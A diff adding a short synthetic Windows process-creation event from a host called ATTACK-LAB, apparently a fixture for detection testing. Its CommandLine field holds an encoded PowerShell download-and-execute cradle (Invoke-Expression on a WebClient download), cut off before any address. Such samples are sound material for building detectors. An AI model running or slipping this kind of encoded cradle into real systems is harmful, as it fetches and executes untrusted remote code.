@@ -1,0 +1,6 @@
+TimeGenerated=2026-03-05T10:15:00Z
+EventCode=4688
+User=Administrator
+ProcessName=powershell.exe
+CommandLine=powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcA
+Host=ATTACK-LAB
